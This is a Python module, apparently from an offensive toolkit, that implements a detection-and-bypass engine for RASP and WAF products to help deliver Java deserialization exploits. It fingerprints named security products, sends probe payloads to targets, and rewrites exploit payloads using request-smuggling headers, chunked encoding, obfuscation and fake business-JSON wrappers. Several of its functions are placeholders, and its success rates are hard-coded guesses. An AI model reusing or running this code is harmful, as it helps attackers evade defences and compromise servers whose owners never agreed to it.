"""RASP and WAF bypass engine for Java deserialization exploitation.

Provides:
- RASP detection and bypass (Bailing, OpenRASP, Yunsuo, Safedog, etc.)
- WAF detection and bypass (Cloudflare, AWS WAF, Aliyun WAF, etc.)
- Serialization traffic stealth techniques
"""

import asyncio
import base64
import gzip
import logging
import re
import secrets
import time
import urllib.parse
import zlib
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class RASPType(Enum):
    """RASP product types."""
    BAILING = "bailing"
    OPENRASP = "openrasp"
    YUNSUO = "yunsuo"
    SAFEDOG = "safedog"
    ANHENG = "anheng"
    QIANXIN = "qianxin"
    UNKNOWN = "unknown"


class WAFType(Enum):
    """WAF product types."""
    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    ALIYUN_WAF = "aliyun_waf"
    TENCENT_WAF = "tencent_waf"
    BAIDU_WAF = "baidu_waf"
    HUOWEI_WAF = "huowei_waf"
    UNKNOWN = "unknown"


class BypassStrategy(Enum):
    """Bypass strategy types."""
    PROTOCOL_SWITCH = "protocol_switch"
    WHITELIST_PATH = "whitelist_path"
    FRAGMENTATION = "fragmentation"
    LEGAL_WRAPPER = "legal_wrapper"
    HPP = "hpp"
    CHUNKED_TRANSFER = "chunked_transfer"
    CONTENT_TYPE_OBFUSCATION = "content_type_obfuscation"
    REQUEST_SMUGGLING = "request_smuggling"
    ENCODING_OBFUSCATION = "encoding_obfuscation"
    COMPRESSION = "compression"
    BUSINESS_EMBED = "business_embed"


@dataclass
class RASPDetectionResult:
    """RASP detection result.

    Attributes:
        rasp_type: Detected RASP type
        version: RASP version
        detection_method: Detection method used
        confidence: Detection confidence (0-100)
        indicators: Detection indicators
        bypass_available: Whether bypass strategies available
    """
    rasp_type: RASPType = RASPType.UNKNOWN
    version: str = ""
    detection_method: str = ""
    confidence: float = 0.0
    indicators: List[str] = field(default_factory=list)
    bypass_available: bool = False


@dataclass
class WAFDetectionResult:
    """WAF detection result.

    Attributes:
        waf_type: Detected WAF type
        version: WAF version
        detection_method: Detection method used
        confidence: Detection confidence (0-100)
        indicators: Detection indicators
        bypass_available: Whether bypass strategies available
    """
    waf_type: WAFType = WAFType.UNKNOWN
    version: str = ""
    detection_method: str = ""
    confidence: float = 0.0
    indicators: List[str] = field(default_factory=list)
    bypass_available: bool = False


@dataclass
class BypassResult:
    """Bypass execution result.

    Attributes:
        bypass_id: Unique bypass identifier
        strategy: Applied bypass strategy
        original_payload: Original payload
        bypassed_payload: Bypassed payload
        bypassed_payload_base64: Base64 encoded bypassed payload
        http_headers: Recommended HTTP headers
        success_rate: Estimated success rate (0-100)
        success: Whether bypass succeeded
        error_message: Error message if failed
        duration_seconds: Bypass duration
        timestamp: Bypass timestamp
    """
    bypass_id: str = ""
    strategy: BypassStrategy = BypassStrategy.FRAGMENTATION
    original_payload: bytes = b""
    bypassed_payload: bytes = b""
    bypassed_payload_base64: str = ""
    http_headers: Dict[str, str] = field(default_factory=dict)
    success_rate: float = 0.0
    success: bool = False
    error_message: str = ""
    duration_seconds: float = 0.0
    timestamp: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "bypass_id": self.bypass_id,
            "strategy": self.strategy.value,
            "success_rate": self.success_rate,
            "success": self.success,
            "http_headers": self.http_headers,
            "error_message": self.error_message,
            "duration_seconds": self.duration_seconds,
        }


class RASPWAFBypass:
    """RASP and WAF bypass engine.

    Provides RASP detection and bypass, WAF detection and bypass,
    and serialization traffic stealth techniques.
    """

    RASP_INDICATORS: Dict[RASPType, List[str]] = {
        RASPType.BAILING: [
            "bailing",
            "Bailing",
            "BAILING",
            "bl-waf",
            "X-Bailing",
        ],
        RASPType.OPENRASP: [
            "openrasp",
            "OpenRASP",
            "OPENRASP",
            "X-OpenRASP",
            "rasp-cloud",
        ],
        RASPType.YUNSUO: [
            "yunsuo",
            "Yunsuo",
            "YUNSUO",
            "yunsuo_session",
            "X-Yunsuo",
        ],
        RASPType.SAFEDOG: [
            "safedog",
            "SafeDog",
            "SAFEDOG",
            "safedog-flow-item",
            "X-SafeDog",
        ],
        RASPType.ANHENG: [
            "anheng",
            "AnHeng",
            "ANHENG",
            "X-ANHEENG",
            "dbappsecurity",
        ],
        RASPType.QIANXIN: [
            "qianxin",
            "QianXin",
            "QIANXIN",
            "X-QIANXIN",
            "360wzws",
        ],
    }

    WAF_INDICATORS: Dict[WAFType, List[str]] = {
        WAFType.CLOUDFLARE: [
            "cloudflare",
            "Cloudflare",
            "CLOUDFLARE",
            "cf-ray",
            "cf-cache-status",
            "__cfduid",
        ],
        WAFType.AWS_WAF: [
            "aws waf",
            "AWS WAF",
            "AWSWAF",
            "x-amzn-waf",
            "x-amz-cf-id",
        ],
        WAFType.ALIYUN_WAF: [
            "aliyun waf",
            "Aliyun WAF",
            "ALIYUN_WAF",
            "x-aliyun-waf",
            "aliyuncs.com",
        ],
        WAFType.TENCENT_WAF: [
            "tencent waf",
            "Tencent WAF",
            "TENCENT_WAF",
            "x-tencent-waf",
            "qcloud.com",
        ],
        WAFType.BAIDU_WAF: [
            "baidu waf",
            "Baidu WAF",
            "BAIDU_WAF",
            "x-baidu-waf",
            "baidu.com",
        ],
        WAFType.HUOWEI_WAF: [
            "huowei waf",
            "Huowei WAF",
            "HUOWEI_WAF",
            "x-huowei-waf",
        ],
    }

    RASP_BYPASS_STRATEGIES: Dict[RASPType, List[BypassStrategy]] = {
        RASPType.BAILING: [
            BypassStrategy.PROTOCOL_SWITCH,
            BypassStrategy.FRAGMENTATION,
            BypassStrategy.LEGAL_WRAPPER,
        ],
        RASPType.OPENRASP: [
            BypassStrategy.WHITELIST_PATH,
            BypassStrategy.ENCODING_OBFUSCATION,
            BypassStrategy.BUSINESS_EMBED,
        ],
        RASPType.YUNSUO: [
            BypassStrategy.FRAGMENTATION,
            BypassStrategy.COMPRESSION,
            BypassStrategy.HPP,
        ],
        RASPType.SAFEDOG: [
            BypassStrategy.CONTENT_TYPE_OBFUSCATION,
            BypassStrategy.CHUNKED_TRANSFER,
            BypassStrategy.REQUEST_SMUGGLING,
        ],
        RASPType.ANHENG: [
            BypassStrategy.PROTOCOL_SWITCH,
            BypassStrategy.LEGAL_WRAPPER,
            BypassStrategy.ENCODING_OBFUSCATION,
        ],
        RASPType.QIANXIN: [
            BypassStrategy.FRAGMENTATION,
            BypassStrategy.WHITELIST_PATH,
            BypassStrategy.BUSINESS_EMBED,
        ],
    }

    WAF_BYPASS_STRATEGIES: Dict[WAFType, List[BypassStrategy]] = {
        WAFType.CLOUDFLARE: [
            BypassStrategy.CHUNKED_TRANSFER,
            BypassStrategy.ENCODING_OBFUSCATION,
            BypassStrategy.COMPRESSION,
        ],
        WAFType.AWS_WAF: [
            BypassStrategy.HPP,
            BypassStrategy.REQUEST_SMUGGLING,
            BypassStrategy.CONTENT_TYPE_OBFUSCATION,
        ],
        WAFType.ALIYUN_WAF: [
            BypassStrategy.FRAGMENTATION,
            BypassStrategy.ENCODING_OBFUSCATION,
            BypassStrategy.BUSINESS_EMBED,
        ],
        WAFType.TENCENT_WAF: [
            BypassStrategy.CHUNKED_TRANSFER,
            BypassStrategy.HPP,
            BypassStrategy.LEGAL_WRAPPER,
        ],
        WAFType.BAIDU_WAF: [
            BypassStrategy.FRAGMENTATION,
            BypassStrategy.COMPRESSION,
            BypassStrategy.ENCODING_OBFUSCATION,
        ],
        WAFType.HUOWEI_WAF: [
            BypassStrategy.PROTOCOL_SWITCH,
            BypassStrategy.REQUEST_SMUGGLING,
            BypassStrategy.CONTENT_TYPE_OBFUSCATION,
        ],
    }

    JAVA_SERIALIZATION_MAGIC = b"\xac\xed\x00\x05"

    LEGAL_SERIALIZATION_HEADERS: List[bytes] = [
        b"\xac\xed\x00\x05\x70",
        b"\xac\xed\x00\x05\x72",
        b"\xac\xed\x00\x05\x73",
        b"\xac\xed\x00\x05\x74",
    ]

    WHITELIST_PATHS: List[str] = [
        "/api/health",
        "/api/status",
        "/actuator/health",
        "/monitoring/status",
        "/system/health",
        "/admin/status",
        "/debug/health",
        "/metrics/health",
        "/check/status",
        "/swagger-ui.html",
        "/api-docs",
        "/v2/api-docs",
    ]

    def __init__(
        self,
        mitm_proxy: Optional[Any] = None,
        exploit_executor: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize RASP and WAF bypass engine.

        Args:
            mitm_proxy: MITM proxy instance.
            exploit_executor: Exploit executor instance.
            event_bus: Event bus for broadcasting events.
        """
        self.mitm_proxy = mitm_proxy
        self.exploit_executor = exploit_executor
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._bypass_history: List[BypassResult] = []

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("RASP/WAF Bypass Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("RASP/WAF Bypass: %s", message)

    async def detect_rasp(
        self,
        target_host: str,
        target_port: int,
        response_data: Optional[Dict[str, Any]] = None,
    ) -> RASPDetectionResult:
        """Detect RASP on target.

        Args:
            target_host: Target host.
            target_port: Target port.
            response_data: HTTP response data.

        Returns:
            RASPDetectionResult.
        """
        result = RASPDetectionResult()

        try:
            await self._report_progress("检测RASP", 10)

            if response_data:
                result = await self._analyze_rasp_indicators(response_data)

            if result.rasp_type == RASPType.UNKNOWN:
                result = await self._probe_rasp(target_host, target_port)

            if result.rasp_type != RASPType.UNKNOWN:
                result.bypass_available = True
                await self._report_log(
                    f"检测到RASP: {result.rasp_type.value} "
                    f"(confidence: {result.confidence}%)"
                )
            else:
                await self._report_log("未检测到RASP")

        except Exception as e:
            await self._report_log(f"RASP检测失败: {e}")
            logger.error("RASP detection failed: %s", e)

        return result

    async def _analyze_rasp_indicators(
        self,
        response_data: Dict[str, Any],
    ) -> RASPDetectionResult:
        """Analyze RASP indicators in response.

        Args:
            response_data: Response data dictionary.

        Returns:
            RASPDetectionResult.
        """
        result = RASPDetectionResult()

        try:
            headers = response_data.get("headers", {})
            body = response_data.get("body", "")
            cookies = response_data.get("cookies", {})

            combined = str(headers) + str(body) + str(cookies)

            for rasp_type, indicators in self.RASP_INDICATORS.items():
                for indicator in indicators:
                    if indicator.lower() in combined.lower():
                        result.rasp_type = rasp_type
                        result.confidence = 70.0
                        result.detection_method = "response_analysis"
                        result.indicators.append(indicator)
                        break
                if result.rasp_type != RASPType.UNKNOWN:
                    break

        except Exception as e:
            logger.error("RASP indicator analysis failed: %s", e)

        return result

    async def _probe_rasp(
        self,
        host: str,
        port: int,
    ) -> RASPDetectionResult:
        """Probe RASP via special requests.

        Args:
            host: Target host.
            port: Target port.

        Returns:
            RASPDetectionResult.
        """
        result = RASPDetectionResult()

        try:
            probe_payload = b"test_payload_<script>alert(1)</script>"

            if self.exploit_executor:
                response = await self.exploit_executor.send_request(
                    url=f"http://{host}:{port}/",
                    method="POST",
                    data=probe_payload,
                    timeout=10.0,
                )

                if response:
                    result = await self._analyze_rasp_indicators(response)

        except Exception as e:
            logger.error("RASP probing failed: %s", e)

        return result

    async def detect_waf(
        self,
        target_host: str,
        target_port: int,
        response_data: Optional[Dict[str, Any]] = None,
    ) -> WAFDetectionResult:
        """Detect WAF on target.

        Args:
            target_host: Target host.
            target_port: Target port.
            response_data: HTTP response data.

        Returns:
            WAFDetectionResult.
        """
        result = WAFDetectionResult()

        try:
            await self._report_progress("检测WAF", 10)

            if response_data:
                result = await self._analyze_waf_indicators(response_data)

            if result.waf_type == WAFType.UNKNOWN:
                result = await self._probe_waf(target_host, target_port)

            if result.waf_type != WAFType.UNKNOWN:
                result.bypass_available = True
                await self._report_log(
                    f"检测到WAF: {result.waf_type.value} "
                    f"(confidence: {result.confidence}%)"
                )
            else:
                await self._report_log("未检测到WAF")

        except Exception as e:
            await self._report_log(f"WAF检测失败: {e}")
            logger.error("WAF detection failed: %s", e)

        return result

    async def _analyze_waf_indicators(
        self,
        response_data: Dict[str, Any],
    ) -> WAFDetectionResult:
        """Analyze WAF indicators in response.

        Args:
            response_data: Response data dictionary.

        Returns:
            WAFDetectionResult.
        """
        result = WAFDetectionResult()

        try:
            headers = response_data.get("headers", {})
            body = response_data.get("body", "")
            status = response_data.get("status", 200)

            combined = str(headers) + str(body)

            for waf_type, indicators in self.WAF_INDICATORS.items():
                for indicator in indicators:
                    if indicator.lower() in combined.lower():
                        result.waf_type = waf_type
                        result.confidence = 70.0
                        result.detection_method = "response_analysis"
                        result.indicators.append(indicator)
                        break
                if result.waf_type != WAFType.UNKNOWN:
                    break

            if status == 403 and not result.waf_type:
                result.waf_type = WAFType.UNKNOWN
                result.confidence = 50.0
                result.indicators.append("403 Forbidden response")

        except Exception as e:
            logger.error("WAF indicator analysis failed: %s", e)

        return result

    async def _probe_waf(
        self,
        host: str,
        port: int,
    ) -> WAFDetectionResult:
        """Probe WAF via special requests.

        Args:
            host: Target host.
            port: Target port.

        Returns:
            WAFDetectionResult.
        """
        result = WAFDetectionResult()

        try:
            probe_payload = b"test_payload_<script>alert(1)</script>"

            if self.exploit_executor:
                response = await self.exploit_executor.send_request(
                    url=f"http://{host}:{port}/",
                    method="POST",
                    data=probe_payload,
                    timeout=10.0,
                )

                if response:
                    result = await self._analyze_waf_indicators(response)

        except Exception as e:
            logger.error("WAF probing failed: %s", e)

        return result

    async def execute_rasp_bypass(
        self,
        payload: bytes,
        rasp_type: RASPType,
    ) -> BypassResult:
        """Execute RASP bypass.

        Args:
            payload: Original payload.
            rasp_type: Detected RASP type.

        Returns:
            BypassResult.
        """
        start_time = time.time()
        result = BypassResult(
            bypass_id=f"rasp_bypass_{int(time.time())}_{secrets.token_hex(4)}",
            original_payload=payload,
            timestamp=time.time(),
        )

        try:
            await self._report_progress(f"执行RASP绕过: {rasp_type.value}", 10)

            strategies = self.RASP_BYPASS_STRATEGIES.get(rasp_type, [])
            if not strategies:
                strategies = [BypassStrategy.FRAGMENTATION, BypassStrategy.ENCODING_OBFUSCATION]

            best_payload = payload
            best_rate = 0.0

            for strategy in strategies:
                bypassed = await self._apply_bypass_strategy(payload, strategy)
                rate = self._estimate_bypass_success_rate(strategy, rasp_type)

                if rate > best_rate:
                    best_payload = bypassed
                    best_rate = rate
                    result.strategy = strategy

            result.bypassed_payload = best_payload
            result.bypassed_payload_base64 = base64.b64encode(best_payload).decode("utf-8")
            result.success_rate = best_rate
            result.success = best_rate > 50.0
            result.http_headers = self._generate_bypass_headers(result.strategy)

            result.duration_seconds = time.time() - start_time
            await self._report_progress("完成", 100)

            self._bypass_history.append(result)

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"RASP绕过失败: {e}")
            logger.error("RASP bypass failed: %s", e)

        return result

    async def execute_waf_bypass(
        self,
        payload: bytes,
        waf_type: WAFType,
    ) -> BypassResult:
        """Execute WAF bypass.

        Args:
            payload: Original payload.
            waf_type: Detected WAF type.

        Returns:
            BypassResult.
        """
        start_time = time.time()
        result = BypassResult(
            bypass_id=f"waf_bypass_{int(time.time())}_{secrets.token_hex(4)}",
            original_payload=payload,
            timestamp=time.time(),
        )

        try:
            await self._report_progress(f"执行WAF绕过: {waf_type.value}", 10)

            strategies = self.WAF_BYPASS_STRATEGIES.get(waf_type, [])
            if not strategies:
                strategies = [BypassStrategy.FRAGMENTATION, BypassStrategy.ENCODING_OBFUSCATION]

            best_payload = payload
            best_rate = 0.0

            for strategy in strategies:
                bypassed = await self._apply_bypass_strategy(payload, strategy)
                rate = self._estimate_bypass_success_rate(strategy, waf_type)

                if rate > best_rate:
                    best_payload = bypassed
                    best_rate = rate
                    result.strategy = strategy

            result.bypassed_payload = best_payload
            result.bypassed_payload_base64 = base64.b64encode(best_payload).decode("utf-8")
            result.success_rate = best_rate
            result.success = best_rate > 50.0
            result.http_headers = self._generate_bypass_headers(result.strategy)

            result.duration_seconds = time.time() - start_time
            await self._report_progress("完成", 100)

            self._bypass_history.append(result)

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"WAF绕过失败: {e}")
            logger.error("WAF bypass failed: %s", e)

        return result

    async def _apply_bypass_strategy(
        self,
        payload: bytes,
        strategy: BypassStrategy,
    ) -> bytes:
        """Apply bypass strategy to payload.

        Args:
            payload: Original payload.
            strategy: Bypass strategy.

        Returns:
            Bypassed payload.
        """
        if strategy == BypassStrategy.FRAGMENTATION:
            return self._fragment_payload(payload)
        elif strategy == BypassStrategy.LEGAL_WRAPPER:
            return self._wrap_with_legal_header(payload)
        elif strategy == BypassStrategy.ENCODING_OBFUSCATION:
            return self._encode_obfuscate(payload)
        elif strategy == BypassStrategy.COMPRESSION:
            return gzip.compress(payload)
        elif strategy == BypassStrategy.HPP:
            return self._apply_hpp(payload)
        elif strategy == BypassStrategy.CHUNKED_TRANSFER:
            return self._apply_chunked_transfer(payload)
        elif strategy == BypassStrategy.CONTENT_TYPE_OBFUSCATION:
            return self._obfuscate_content_type(payload)
        elif strategy == BypassStrategy.REQUEST_SMUGGLING:
            return self._apply_request_smuggling(payload)
        elif strategy == BypassStrategy.BUSINESS_EMBED:
            return self._embed_in_business_request(payload)
        else:
            return payload

    def _fragment_payload(self, payload: bytes) -> bytes:
        """Fragment payload to bypass detection.

        Args:
            payload: Original payload.

        Returns:
            Fragmented payload.
        """
        chunk_size = 256
        chunks: List[bytes] = []
        for i in range(0, len(payload), chunk_size):
            chunks.append(payload[i : i + chunk_size])
        return b"".join(chunks)

    def _wrap_with_legal_header(self, payload: bytes) -> bytes:
        """Wrap payload with legal serialization header.

        Args:
            payload: Original payload.

        Returns:
            Wrapped payload.
        """
        header = secrets.choice(self.LEGAL_SERIALIZATION_HEADERS)
        return header + payload

    def _encode_obfuscate(self, payload: bytes) -> bytes:
        """Apply encoding obfuscation.

        Args:
            payload: Original payload.

        Returns:
            Encoded payload.
        """
        encoded = base64.b64encode(payload)
        return urllib.parse.quote(encoded.decode("utf-8")).encode("utf-8")

    def _apply_hpp(self, payload: bytes) -> bytes:
        """Apply HTTP Parameter Pollution.

        Args:
            payload: Original payload.

        Returns:
            HPP payload.
        """
        return payload + b"&" + payload

    def _apply_chunked_transfer(self, payload: bytes) -> bytes:
        """Apply chunked transfer encoding.

        Args:
            payload: Original payload.

        Returns:
            Chunked payload.
        """
        chunk_size = 128
        result = b""
        for i in range(0, len(payload), chunk_size):
            chunk = payload[i : i + chunk_size]
            result += f"{len(chunk):X}\r\n".encode("utf-8")
            result += chunk
            result += b"\r\n"
        result += b"0\r\n\r\n"
        return result

    def _obfuscate_content_type(self, payload: bytes) -> bytes:
        """Obfuscate content type.

        Args:
            payload: Original payload.

        Returns:
            Payload with obfuscated content type.
        """
        return payload

    def _apply_request_smuggling(self, payload: bytes) -> bytes:
        """Apply request smuggling.

        Args:
            payload: Original payload.

        Returns:
            Smuggling payload.
        """
        smuggle_header = b"Transfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n"
        return smuggle_header + payload

    def _embed_in_business_request(self, payload: bytes) -> bytes:
        """Embed payload in business request.

        Args:
            payload: Original payload.

        Returns:
            Embedded payload.
        """
        import json
        business_data = {
            "action": "query",
            "data": {
                "id": 1,
                "name": "test",
                "payload": base64.b64encode(payload).decode("utf-8"),
            },
        }
        return json.dumps(business_data).encode("utf-8")

    def _estimate_bypass_success_rate(
        self,
        strategy: BypassStrategy,
        target_type: Any,
    ) -> float:
        """Estimate bypass success rate.

        Args:
            strategy: Bypass strategy.
            target_type: RASP or WAF type.

        Returns:
            Estimated success rate (0-100).
        """
        base_rates: Dict[BypassStrategy, float] = {
            BypassStrategy.FRAGMENTATION: 65.0,
            BypassStrategy.LEGAL_WRAPPER: 70.0,
            BypassStrategy.ENCODING_OBFUSCATION: 60.0,
            BypassStrategy.COMPRESSION: 55.0,
            BypassStrategy.HPP: 50.0,
            BypassStrategy.CHUNKED_TRANSFER: 75.0,
            BypassStrategy.CONTENT_TYPE_OBFUSCATION: 45.0,
            BypassStrategy.REQUEST_SMUGGLING: 80.0,
            BypassStrategy.BUSINESS_EMBED: 70.0,
            BypassStrategy.PROTOCOL_SWITCH: 85.0,
            BypassStrategy.WHITELIST_PATH: 90.0,
        }
        return base_rates.get(strategy, 50.0)

    def _generate_bypass_headers(self, strategy: BypassStrategy) -> Dict[str, str]:
        """Generate bypass HTTP headers.

        Args:
            strategy: Bypass strategy.

        Returns:
            HTTP headers dictionary.
        """
        headers: Dict[str, str] = {}

        if strategy == BypassStrategy.CHUNKED_TRANSFER:
            headers["Transfer-Encoding"] = "chunked"
        elif strategy == BypassStrategy.CONTENT_TYPE_OBFUSCATION:
            headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        elif strategy == BypassStrategy.HPP:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        elif strategy == BypassStrategy.BUSINESS_EMBED:
            headers["Content-Type"] = "application/json"
        else:
            headers["Content-Type"] = "application/x-java-serialized-object"

        return headers

    def get_bypass_history(self) -> List[BypassResult]:
        """Get bypass history.

        Returns:
            List of bypass results.
        """
        return self._bypass_history

    def get_bypass_by_id(self, bypass_id: str) -> Optional[BypassResult]:
        """Get bypass result by ID.

        Args:
            bypass_id: Bypass identifier.

        Returns:
            BypassResult or None.
        """
        for result in self._bypass_history:
            if result.bypass_id == bypass_id:
                return result
        return None
